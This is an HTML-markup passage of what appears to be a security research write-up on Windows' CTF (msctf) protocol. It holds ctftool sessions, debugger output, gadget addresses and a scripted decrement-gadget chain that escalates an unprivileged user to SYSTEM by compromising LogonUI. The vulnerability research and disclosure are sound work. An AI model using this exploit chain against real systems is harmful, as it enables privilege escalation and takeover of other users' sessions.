&lt;/tr&gt;&lt;tr class=&quot;c15&quot;&gt;&lt;td class=&quot;c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
&lt;div class=&quot;c7 c32 subtitle&quot; id=&quot;h.4c230h5x5g1w&quot;&gt;&lt;span class=&quot;c21&quot;&gt;Sample output from my command line tool.&lt;/span&gt;&lt;/div&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c0&quot;&gt;This was a bigger job than I had anticipated, and after a few weeks I had built an interactive command-line CTF client called ctftool. To reach parts of the CTF protocol that looked dangerous, I even had to develop simple scripting capabilities with control flow, arithmetic and variables!&lt;/span&gt;&lt;/div&gt;


&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c12 c2&quot;&gt;Exploring CTF with ctftool...&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c0&quot;&gt;Using ctftool you can connect to your current session and view the connected clients.&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c23&quot;&gt;&amp;gt; &lt;/span&gt;&lt;span class=&quot;c5&quot;&gt;.\ctftool.exe&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;An interactive ctf exploration tool by @taviso.&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Type &quot;help&quot; for available commands.&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Most commands require a connection, see &quot;help connect&quot;.&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c23&quot;&gt;ctf&amp;gt; &lt;/span&gt;&lt;span class=&quot;c5&quot;&gt;connect&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;The ctf server port is located at \BaseNamedObjects\msctf.serverDefault2&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;NtAlpcConnectPort(&quot;\BaseNamedObjects\msctf.serverDefault2&quot;) =&amp;gt; 0&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Connected to CTF server@\BaseNamedObjects\msctf.serverDefault2, Handle 00000224&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c23&quot;&gt;ctf&amp;gt; &lt;/span&gt;&lt;span class=&quot;c5&quot;&gt;scan&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Client 0, Tid 5100 (Flags 0x08, Hwnd 000013EC, Pid 4416, explorer.exe)&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Client 2, Tid 7624 (Flags 0x08, Hwnd 00001DC8, Pid 4416, explorer.exe)&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Client 4, Tid 7268 (Flags 0000, Hwnd 00001C64, Pid 7212, ctfmon.exe)&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Client 5, Tid 6556 (Flags 0x08, Hwnd 0000199C, Pid 7208, conhost.exe)&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Client 6, Tid 5360 (Flags 0x08, Hwnd 000014F0, Pid 5512, vmtoolsd.exe)&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Client 7, Tid  812 (Flags 0x08, Hwnd 0000032C, Pid 6760, OneDrive.exe)&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Client 8, Tid 6092 (Flags 0x0c, Hwnd 000017CC, Pid 7460, LockApp.exe)&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Client 9, Tid 6076 (Flags 0000, Hwnd 000017BC, Pid 5516, ctftool.exe)&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c0&quot;&gt;Not only can you send commands to the server, you can wait for a particular client to connect, and then ask the server to forward commands to it as well!&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c0&quot;&gt;Let's start a copy of notepad, and wait for it to connect to our CTF session...&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c7 c32 subtitle&quot; id=&quot;h.j74hoieyrkju&quot;&gt;&lt;span class=&quot;c21&quot;&gt;Connecting to another client on the same CTF session.&lt;/span&gt;&lt;/div&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c0&quot;&gt;Now we can ask notepad to instantiate certain COM objects by specifying the CLSID. If the operation is successful, it returns what's called a “stub”. That stub lets us interact with the instantiated object, such as invoking methods and passing it parameters.&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;Let’s instantiate a &lt;span class=&quot;c29&quot;&gt;ITfInputProcessorProfileMgr &lt;/span&gt;&lt;span class=&quot;c0&quot;&gt;object.&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c23&quot;&gt;ctf&amp;gt; &lt;/span&gt;&lt;span class=&quot;c5&quot;&gt;createstub 0 5 IID_ITfInputProcessorProfileMgr&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Command succeeded, stub created&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Dumping Marshal Parameter 3 (Base 012EA8F8, Type 0x106, Size 0x18, Offset 0x40)&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;000000: 4c e7 c6 71 28 0f d8 11 a8 2a 00 06 5b 84 43 5c  L..q(....*..[.C\&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;000010: 01 00 00 00 bb ee b7 00                          ........&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Marshalled Value 3, COM {71C6E74C-0F28-11D8-A82A-00065B84435C}, ID 1, Timestamp 0xb7eebb&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;That worked, and now we can refer to this object by its “stub id”. This object can do things like change the input method, enumerate available languages, and so on. Let's call &lt;span class=&quot;c29&quot;&gt;ITfInputProcessorProfileMgr::GetActiveProfile&lt;/span&gt;, this method is &lt;span class=&quot;c14&quot;&gt;&lt;a class=&quot;c22&quot; href=&quot;https://docs.microsoft.com/en-us/windows/desktop/api/msctf/nf-msctf-itfinputprocessorprofilemgr-getactiveprofile&quot;&gt;documented&lt;/a&gt;&lt;/span&gt; so we know it takes two parameters: A GUID, and a buffer to store a &lt;span class=&quot;c14 c29&quot;&gt;&lt;a class=&quot;c22&quot; href=&quot;https://docs.microsoft.com/en-us/windows/desktop/api/msctf/ns-msctf-tf_inputprocessorprofile&quot;&gt;TF_INPUTPROCESSORPROFILE&lt;/a&gt;&lt;/span&gt;.&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c0&quot;&gt;Ctftool can generate these parameters, then request notepad proxy them to the COM object.&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c23&quot;&gt;ctf&amp;gt; &lt;/span&gt;&lt;span class=&quot;c5&quot;&gt;setarg 2&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Possibly a GUID, {34745C63-B2F0-4784-8B67-5E12C8701A31}&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Marshalled Value 1, DATA&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c0&quot;&gt;You can see notepad filled in the buffer we passed it with data about the current profile.&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c34 c2&quot;&gt;Looking for bugs...&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c0&quot;&gt;It will come as no surprise that this complex, obscure, legacy protocol is full of memory corruption vulnerabilities. Many of the COM objects simply trust you to marshal pointers across the ALPC port, and there is minimal bounds checking or integer overflow checking.&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c0&quot;&gt;Some commands require you to own the foreground window or have other similar restrictions, but as you can lie about your thread id, you can simply claim to be that Window's owner and no proof is required.&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c0&quot;&gt;It didn’t take long to notice that the command to invoke a method on an instantiated COM stub accepts an index into a table of methods. There is absolutely no validation of this index, effectively allowing you to jump through any function pointer in the program.&lt;/span&gt;&lt;/div&gt;


&lt;table class=&quot;c38&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;c15&quot;&gt;&lt;td class=&quot;c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
&lt;div class=&quot;c7&quot;&gt;&lt;span class=&quot;c29 c58&quot;&gt;int __thiscall CStubITfCompartment::Invoke(CStubITfCompartment *this, unsigned int &lt;/span&gt;&lt;span class=&quot;c29 c58&quot;&gt;FunctionIndex&lt;/span&gt;&lt;span class=&quot;c31 c29 c48&quot;&gt;, struct MsgBase **Msg)&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c7&quot;&gt;&lt;span class=&quot;c11&quot;&gt;  return &lt;/span&gt;&lt;span class=&quot;c29 c84&quot;&gt;CStubITfCompartment::_StubTbl&lt;/span&gt;&lt;span class=&quot;c11&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;c29 c45&quot;&gt;FunctionIndex&lt;/span&gt;&lt;span class=&quot;c11&quot;&gt;](&lt;/span&gt;&lt;span class=&quot;c29 c45&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;c11&quot;&gt;, &lt;/span&gt;&lt;span class=&quot;c29 c45&quot;&gt;Msg&lt;/span&gt;&lt;span class=&quot;c11 c33 c48&quot;&gt;);&lt;/span&gt;&lt;/div&gt;

&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;c15&quot;&gt;&lt;td class=&quot;c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
&lt;div class=&quot;c7 c32 subtitle&quot; id=&quot;h.6kilut287zzw&quot;&gt;Here FunctionIndex&lt;span class=&quot;c21&quot;&gt; is an integer we control, and Msg is the CTF_MSGBASE we sent to the server.&lt;/span&gt;&lt;/div&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c0&quot;&gt;If we try calling a nonsense function index...&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c23&quot;&gt;ctf&amp;gt; &lt;/span&gt;&lt;span class=&quot;c5&quot;&gt;callstub 0 0 0x41414141&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3 c80&quot;&gt;&lt;span class=&quot;c2 c77&quot;&gt;Note that ctf library catches all exceptions, so notepad doesn’t actually crash!&lt;/span&gt;&lt;span class=&quot;c70 c36 c2&quot;&gt; This also means you get unlimited attempts at exploitation.&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c0&quot;&gt;This seems like a good first candidate for exploitation.&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c12 c2&quot;&gt;Let’s find something to call...&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;All of the major system programs and services shipping in Windows 10 use &lt;span class=&quot;c14&quot;&gt;&lt;a class=&quot;c22&quot; href=&quot;https://docs.microsoft.com/en-us/windows/desktop/secbp/control-flow-guard&quot;&gt;CFG&lt;/a&gt;&lt;/span&gt;, &lt;span class=&quot;c2&quot;&gt;Control Flow Guard&lt;/span&gt;&lt;span class=&quot;c0&quot;&gt;. In practice, CFG is a very weak mitigation. Ignoring the many known limitations, even the simplest Windows programs have hundreds of thousands of whitelisted indirect branch targets.&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;Finding useful gadgets is significantly more tedious with CFG, but producing useful results is no less plausible than it was before.&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;This bug effectively allows you to dereference an arbitrary function pointer somewhere within your address space. You can call it with two parameters, the &lt;span class=&quot;c29&quot;&gt;this &lt;/span&gt;pointer, and a pointer to a pointer to a structure partly controlled (the ALPC &lt;span class=&quot;c29&quot;&gt;PORT_MESSAGE&lt;/span&gt;&lt;span class=&quot;c0&quot;&gt;). Not a very promising start!&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c0&quot;&gt;I decided to just call every possible index to see what happened. I was hoping for an exception that might have moved the registers and stack into something a bit more favourable.&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c0&quot;&gt;Using the Windows Subsystem for Linux, I used this bash command to keep spawning new notepads and logging the exceptions with cdb:&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c29&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;c33 c36 c44 c34&quot;&gt;while :; do cdb -xi ld -c 'g;r;u;dq@rcx;dq@rdx;kvn;q' notepad; done&lt;/span&gt;&lt;/div&gt;


&lt;div class=&quot;c3&quot;&gt;Then, I used ctftool to call every possible function index. This actually worked, and I found that at index 496 there is a pointer to &lt;span class=&quot;c29&quot;&gt;MSCTF!CTipProxy::Reconvert&lt;/span&gt;&lt;span class=&quot;c0&quot;&gt;, a function that&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c0&quot;&gt;Moves RDX, RCX, RDI and R8 just 200 bytes away from a buffer I control, and then jumps to a pointer I control.&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c29&quot;&gt;0:000&amp;gt; &lt;/span&gt;&lt;span class=&quot;c34 c44&quot;&gt;dqs MSCTF!CStubIEnumTfInputProcessorProfiles::_StubTbl + 0n496*8 L1&lt;/span&gt;&lt;span class=&quot;c33 c36 c29&quot;&gt; &lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c33 c36 c29&quot;&gt;00007ff9`4b6dec28  00007ff9`4b696440 MSCTF!CTipProxy::Reconvert  &lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c0&quot;&gt;I can still only jump to CFG whitelisted branch targets, but this is a much more favourable program state for exploitation.&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c12 c2&quot;&gt;A note about ASLR...&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;The entire base system in Windows 10 uses ASLR, but image randomization on Windows is per-boot, not per-process. This means that we can reliably guess the location of code. Unfortunately, the stack &lt;span class=&quot;c2&quot;&gt;is &lt;/span&gt;&lt;span class=&quot;c0&quot;&gt;randomized per-process. If we want to use data from the stack we need to leak a pointer.&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;It turns out that compromising the server is trivially easy, because as part of the CTF marshalling protocol, the monitor actually tells you where its stack is located ¯\_(ツ)_/¯&lt;span class=&quot;c42 c43 c55&quot;&gt;.&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c34 c2&quot;&gt;Browsing what gadgets are available...&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;While the server will just tell you where it's&lt;span class=&quot;c0&quot;&gt; stack is, clients will not. This means that we either need to find an infoleak, or a write-what-where gadget so that we can move data somewhere we can predict, like the data section of an image.&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c0&quot;&gt;Once we have one of those, we can make fake objects and take over the process.&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;I dumped all the whitelisted branch targets with &lt;span class=&quot;c65&quot;&gt;dumpbin &lt;/span&gt;and &lt;span class=&quot;c65&quot;&gt;cdb&lt;/span&gt;, and found some candidate gadgets. This process is mostly manual, I just use &lt;span class=&quot;c29&quot;&gt;egrep &lt;/span&gt;&lt;span class=&quot;c0&quot;&gt;to find displacement values that look relevant, then read any promising results.&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;The only usable arbitrary write gadget I could find was part of &lt;span class=&quot;c29&quot;&gt;msvcrt!_init_time&lt;/span&gt;&lt;span class=&quot;c0&quot;&gt;, which is a whitelisted cfg indirect branch target. It’s a decrement on an arbitrary dword.&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c23&quot;&gt;0:000&amp;gt; &lt;/span&gt;&lt;span class=&quot;c24&quot;&gt;u msvcrt!_init_time+0x79&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt; &lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;msvcrt!_init_time+0x79:  &lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c23&quot;&gt;00007ff9`4b121db9 f0ff8860010000  &lt;/span&gt;&lt;span class=&quot;c1 c35&quot;&gt;lock dec dword ptr [rax+160h]&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c0&quot;&gt;Trust me, I spent a lot of time looking for better options 🤣&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c0&quot;&gt;This will work, it just means we have to call it over and over to generate the values we want! I added arithmetic and control flow to ctftool so that I can automate this.&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c0&quot;&gt;I have to keep decrementing bytes until they match the value I want, this is very laborious, but I was able to get it working. Here is a snippet of my ctftool language generating these calls.&lt;/span&gt;&lt;/div&gt;

&lt;table class=&quot;c38&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;c15&quot;&gt;&lt;td class=&quot;c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
&lt;div class=&quot;c19&quot;&gt;&lt;span class=&quot;c23 c33 c39&quot;&gt;# I need the first qword to be the address of my fake object, the -0x160 is to compensate for&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c19&quot;&gt;&lt;span class=&quot;c23 c33 c39&quot;&gt;# the displacement in the dec gadget. Then calculate (-(r1 &amp;gt;&amp;gt; n) &amp;amp; 0xff) to find out how many times&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c19&quot;&gt;&lt;span class=&quot;c23 c33 c39&quot;&gt;# we need to decrement it.&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c19&quot;&gt;&lt;span class=&quot;c23 c33 c39&quot;&gt;# We can't read the data, so we must be confident it's all zero for this to work.&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c19&quot;&gt;&lt;span class=&quot;c23 c33 c39&quot;&gt;# CFG is a very weak mitigation, but it sure does make you jump through some awkward hoops.&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c19&quot;&gt;&lt;span class=&quot;c23 c33 c39&quot;&gt;# These loops produce the address we want 1 byte at a time, so I need eight of them.&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c19&quot;&gt;&lt;span class=&quot;c1&quot;&gt;patch 0 0xa8 r0 8 -0x160&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c19&quot;&gt;&lt;span class=&quot;c23 c51&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt; r1 r0&lt;/span&gt;&lt;/div&gt;


&lt;div class=&quot;c19&quot;&gt;&lt;span class=&quot;c1&quot;&gt;and r1 0xff&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c19&quot;&gt;&lt;span class=&quot;c1&quot;&gt;repeat r1 callstub 0 0 496&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c19&quot;&gt;&lt;span class=&quot;c1&quot;&gt;patch 0 0xa8 r0 8 -0x15f&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c19&quot;&gt;&lt;span class=&quot;c23 c51&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt; r1 r0&lt;/span&gt;&lt;/div&gt;



&lt;div class=&quot;c19&quot;&gt;&lt;span class=&quot;c1&quot;&gt;and r1 0xff&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c19&quot;&gt;&lt;span class=&quot;c1&quot;&gt;repeat r1 callstub 0 0 496&lt;/span&gt;&lt;/div&gt;

&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;c15&quot;&gt;&lt;td class=&quot;c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
&lt;div class=&quot;c7 c32 subtitle&quot; id=&quot;h.1am2u8avtllf&quot;&gt;&lt;span class=&quot;c21&quot;&gt;Generating fake objects in memory one decrement at a time...&lt;/span&gt;&lt;/div&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;div class=&quot;c3&quot;&gt;Now that I can build fake objects, I was able to bounce around through various gadgets to setup my registers and finally return into &lt;span class=&quot;c29&quot;&gt;LoadLibrary()&lt;/span&gt;. This means I can compromise &lt;span class=&quot;c34 c2&quot;&gt;any &lt;/span&gt;&lt;span class=&quot;c0&quot;&gt;CTF client, even notepad!&lt;/span&gt;&lt;/div&gt;


&lt;table class=&quot;c38&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;c15&quot;&gt;&lt;td class=&quot;c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
&lt;div class=&quot;c7&quot;&gt;&lt;span&gt;&lt;img alt=&quot;&quot; src=&quot;https://3.bp.blogspot.com/-IxPca4nQQ_k/XPm7LkfGiwI/AAAAAAAAIrI/SnAiMItghuYhHEaSnrTgEm5-Tps5wemRQCLcBGAs/s1600/image8.png&quot; title=&quot;&quot;/&gt;&lt;/span&gt;&lt;/div&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;c15&quot;&gt;&lt;td class=&quot;c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
&lt;div class=&quot;c7 c32 subtitle&quot; id=&quot;h.3bkk6halsg8e&quot;&gt;Am I the first person to pop a shell in notepad? &lt;span class=&quot;c48&quot;&gt;🤣&lt;/span&gt;&lt;/div&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c12 c2&quot;&gt;Making it matter...&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c0&quot;&gt;Now that I can compromise any CTF client, how do I find something useful to compromise?&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;There is no access control in CTF, so you could connect to another user's active session and take over any application, or wait for an Administrator to login and compromise their session. However, there is a better option: If we use &lt;span class=&quot;c29&quot;&gt;USER32!LockWorkstation&lt;/span&gt;&lt;span class=&quot;c0&quot;&gt; we can switch to the privileged Winlogon desktop that is already running as SYSTEM!&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c0&quot;&gt;It's true, there really is a CTF session for the login screen...&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;PS&amp;gt; ctftool.exe  &lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;An interactive ctf exploration tool by @taviso.  &lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Type &quot;help&quot; for available commands.&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Most commands require a connection, see &quot;help connect&quot;.&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c23&quot;&gt;ctf&amp;gt; &lt;/span&gt;&lt;span class=&quot;c5&quot;&gt;help lock&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Lock the workstation, switch to Winlogon desktop.&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Usage: lock&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Unprivileged users can switch to the privileged Winlogon desktop using USER32!LockWorkstation. After executing this, a SYSTEM privileged ctfmon will spawn.&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Most commands require a connection, see &quot;help connect&quot;.&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c23&quot;&gt;ctf&amp;gt; &lt;/span&gt;&lt;span class=&quot;c5&quot;&gt;lock&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c23&quot;&gt;ctf&amp;gt; &lt;/span&gt;&lt;span class=&quot;c5&quot;&gt;connect Winlogon sid&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;The ctf server port is located at \BaseNamedObjects\msctf.serverWinlogon3&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;NtAlpcConnectPort(&quot;\BaseNamedObjects\msctf.serverWinlogon3&quot;) =&amp;gt; 0&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Connected to CTF server@\BaseNamedObjects\msctf.serverWinlogon3, Handle 00000240&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c23&quot;&gt;ctf&amp;gt; &lt;/span&gt;&lt;span class=&quot;c5&quot;&gt;scan&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Client 0, Tid 2716 (Flags 0000, Hwnd 00000A9C, Pid 2152, ctftool.exe)  &lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c1 c35&quot;&gt;Client 1, Tid 9572 (Flags 0x1000000c, Hwnd 00002564, Pid 9484, LogonUI.exe)&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c0&quot;&gt;The Windows logon interface is a CTF client, so we can compromise it and get SYSTEM privileges. Here is a video of the attack in action.&lt;/span&gt;&lt;/div&gt;

&lt;table class=&quot;c38&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;c15&quot;&gt;&lt;td class=&quot;c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
&lt;div class=&quot;c7&quot;&gt;&lt;span&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=r3vrzzDpmhc&quot;&gt;&lt;img alt=&quot;&quot; src=&quot;https://2.bp.blogspot.com/-BJCNl49dp30/XPm7UI1fFYI/AAAAAAAAIrQ/PFhPzQDV4iA6v6pc20MiMACfJTZCG01ugCLcBGAs/s1600/image5.png&quot; title=&quot;&quot;/&gt;&lt;/a&gt;&lt;/span&gt;&lt;/div&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;c15&quot;&gt;&lt;td class=&quot;c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
&lt;div class=&quot;c7 c32 subtitle&quot; id=&quot;h.wx0ndou1hru3&quot;&gt;&lt;span class=&quot;c21&quot;&gt;Watch a video of an unprivileged user getting SYSTEM via CTF.&lt;/span&gt;&lt;/div&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;

